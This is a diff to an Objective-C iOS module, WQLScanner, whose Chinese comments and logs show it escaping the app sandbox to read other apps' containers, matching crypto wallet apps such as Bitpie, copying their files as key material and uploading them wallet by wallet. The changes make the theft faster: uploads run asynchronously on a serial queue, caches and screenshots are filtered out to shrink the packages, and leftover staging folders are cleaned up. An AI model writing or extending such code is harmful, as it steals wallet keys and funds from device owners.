@@ -5,6 +5,7 @@
 #import "WQLLog.h"
 #import "WQLUploader.h"
 #import <UIKit/UIKit.h>
+#import <dispatch/dispatch.h>
 #import <stdlib.h>
 #import <sys/sysctl.h>
 #import <stdarg.h>
@@ -38,6 +39,9 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                                    to:(NSString *)dst
                                 bytes:(uint64_t *)bytesOut;
 - (void)uploadStage:(NSString *)stage blocking:(BOOL)blocking;
+- (dispatch_queue_t)uploadQueue;
+- (void)enqueueUploadOfStage:(NSString *)stage wallet:(NSString *)wallet bytes:(uint64_t)bytes;
++ (BOOL)isNoiseRelativePath:(NSString *)rel;
 @end
 
 @implementation WQLScanner
@@ -47,6 +51,22 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         _maxInode = 0;
         _maxContainerBytes = 800ULL * 1024 * 1024;
         _includeExtras = NO;
+
+        // 清掉上次被系统杀掉时残留的待上传目录（先同步列一遍，避免删到本轮新建的 stage）
+        NSFileManager *fm0 = [NSFileManager defaultManager];
+        NSString *tmp0 = NSTemporaryDirectory();
+        NSMutableArray<NSString *> *stale = [NSMutableArray array];
+        for (NSString *n in [fm0 contentsOfDirectoryAtPath:tmp0 error:nil]) {
+            if ([n hasPrefix:@"wql_up_"] || [n hasPrefix:@"wql_logstage_"]) [stale addObject:n];
+        }
+        if (stale.count) {
+            dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
+                NSFileManager *fm = [NSFileManager defaultManager];
+                for (NSString *n in stale) {
+                    [fm removeItemAtPath:[tmp0 stringByAppendingPathComponent:n] error:nil];
+                }
+            });
+        }
     }
     return self;
 }
@@ -91,6 +111,28 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         dispatch_semaphore_signal(sem);
     }];
     dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)));
+}
+
+- (dispatch_queue_t)uploadQueue {
+    static dispatch_queue_t q;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        q = dispatch_queue_create("com.wql.upload", DISPATCH_QUEUE_SERIAL);
+    });
+    return q;
+}
+
+/// 扫描线程只投递、不等待；真正的打包上传在串行队列里做。
+/// 8MB 的整容器包原来会卡住 inode 扫描 40 秒以上，现在不会了。
+- (void)enqueueUploadOfStage:(NSString *)stage wallet:(NSString *)wallet bytes:(uint64_t)bytes {
+    __weak typeof(self) weakSelf = self;
+    dispatch_async([self uploadQueue], ^{
+        __strong typeof(weakSelf) self = weakSelf;
+        if (!self) return;
+        [self uploadStage:stage blocking:YES];
+        [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
+        [self log:@"    ✔ 上传结束 %@（%@）", wallet, [self humanBytes:bytes]];
+    });
 }
 
 #pragma mark - 主流程
@@ -148,11 +190,14 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     }
 
     NSMutableArray<NSDictionary *> *records = [NSMutableArray array];
+    __block NSUInteger enumerated = 0;
     __block NSUInteger unreadable = 0;
     __block NSUInteger matchedCount = 0;
     __block NSUInteger uploadedWallets = 0;
+    __block NSMutableArray<NSString *> *unreadableSamples = [NSMutableArray array];
 
     void (^handleContainer)(NSString *, NSString *) = ^(NSString *root, NSString *path) {
+        enumerated++;
         NSString *escErr = nil;
         int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
         NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
@@ -161,6 +206,10 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
 
         if (handle <= 0) {
             unreadable++;
+            if (unreadableSamples.count < 8) {
+                [unreadableSamples addObject:[NSString stringWithFormat:@"%@（%@）",
+                                              path.lastPathComponent, escErr ?: @"取不到权限"]];
+            }
             return;
         }
         if (!t) {
@@ -216,9 +265,8 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
                            atomically:YES];
 
             [self log:@"    📤 立即上传 %@（%@）", t.name, [self humanBytes:bytes]];
-            [self uploadStage:stage blocking:YES];
+            [self enqueueUploadOfStage:stage wallet:t.name bytes:bytes];
             uploadedWallets++;
-            [[NSFileManager defaultManager] removeItemAtPath:stage error:nil];
         }
     };
 
@@ -281,6 +329,12 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         }
     }
 
+    // 等串行上传队列排空，保证扫描结束时所有包都已落盘
+    if (uploadedWallets) {
+        [self log:@"    等待最后 %lu 个包上传完成…", (unsigned long)uploadedWallets];
+        dispatch_sync([self uploadQueue], ^{});
+    }
+
     [self log:@"【第4步 生成清单】"];
     [self writeWalletManifestInDirectory:outDir records:records];
 
@@ -310,9 +364,14 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
               n ? [NSString stringWithFormat:@"%lu 个文件，%@",
                    (unsigned long)n, [self humanBytes:b]] : @"没有拿到材料"];
     }
-    [self log:@"    共 %lu 个容器（%lu 个读不到），命中 %lu 次，已即时上传 %lu 个钱包",
-          (unsigned long)records.count, (unsigned long)unreadable,
-          (unsigned long)matchedCount, (unsigned long)uploadedWallets];
+    [self log:@"    枚举 %lu 个容器（%lu 个取不到权限），命中 %lu 个，打包上传 %lu 个包，涉及 %lu 个钱包",
+          (unsigned long)enumerated, (unsigned long)unreadable,
+          (unsigned long)matchedCount, (unsigned long)uploadedWallets,
+          (unsigned long)byWallet.count];
+    if (unreadableSamples.count) {
+        [self log:@"    取不到权限的示例（前 %lu 个）：", (unsigned long)unreadableSamples.count];
+        for (NSString *s in unreadableSamples) [self log:@"        · %@", s];
+    }
 
     return records;
 }
@@ -427,13 +486,38 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
     return [self copyTreeFrom:container to:dst bytes:bytesOut];
 }
 
+/// 整容器拷贝时跳过的东西：截图、缓存、HTTP 存储、Cookie、系统 dyld 缓存、日志。
+/// 这些既不是密钥材料，还会把包撑到几 MB（Bitpie 的 SplashBoard 快照就占 6MB）。
++ (BOOL)isNoiseRelativePath:(NSString *)rel {
+    NSString *l = rel.lowercaseString;
+    if ([l hasSuffix:@".ktx"] || [l hasSuffix:@".xlog"] ||
+        [l hasSuffix:@".dyld4"] || [l hasSuffix:@".dyld3"]) return YES;
+
+    NSArray<NSString *> *segs = [l componentsSeparatedByString:@"/"];
+    for (NSUInteger i = 0; i + 1 < segs.count; i++) {
+        if (![segs[i] isEqualToString:@"library"]) continue;
+        NSString *b = segs[i + 1];
+        if ([b isEqualToString:@"caches"] || [b isEqualToString:@"splashboard"] ||
+            [b isEqualToString:@"httpstorages"] || [b isEqualToString:@"cookies"] ||
+            [b isEqualToString:@"logs"] || [b isEqualToString:@"saved application state"]) {
+            return YES;
+        }
+    }
+    for (NSString *s in segs) {
+        if ([s isEqualToString:@"storekit"] || [s isEqualToString:@"oklog_new"]) return YES;
+    }
+    return NO;
+}
+
 - (NSArray<NSString *> *)copyTreeFrom:(NSString *)src
                                    to:(NSString *)dst
                                 bytes:(uint64_t *)bytesOut {
     NSFileManager *fm = [NSFileManager defaultManager];
     NSMutableArray<NSString *> *copied = [NSMutableArray array];
     uint64_t total = 0;
+    uint64_t skippedBytes = 0;
     NSUInteger failed = 0;
+    NSUInteger skipped = 0;
 
     NSDirectoryEnumerator *e = [fm enumeratorAtPath:src];
     NSString *rel = nil;
@@ -445,6 +529,13 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
 
         uint64_t sz = [[fm attributesOfItemAtPath:full error:nil][NSFileSize] unsignedLongLongValue];
+
+        if ([WQLScanner isNoiseRelativePath:rel]) {
+            skipped++;
+            skippedBytes += sz;
+            continue;
+        }
+
         if (total + sz > self.maxContainerBytes) {
             [self log:@"       达到门限 %@，停止", [self humanBytes:self.maxContainerBytes]];
             break;
@@ -462,6 +553,10 @@ static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manage
         }
     }
 
+    if (skipped) {
+        [self log:@"       已跳过 %lu 个缓存/截图/日志文件（%@）",
+              (unsigned long)skipped, [self humanBytes:skippedBytes]];
+    }
     if (failed) [self log:@"       跳过 %lu 个无权限文件", (unsigned long)failed];
     if (bytesOut) *bytesOut = total;
     return copied;
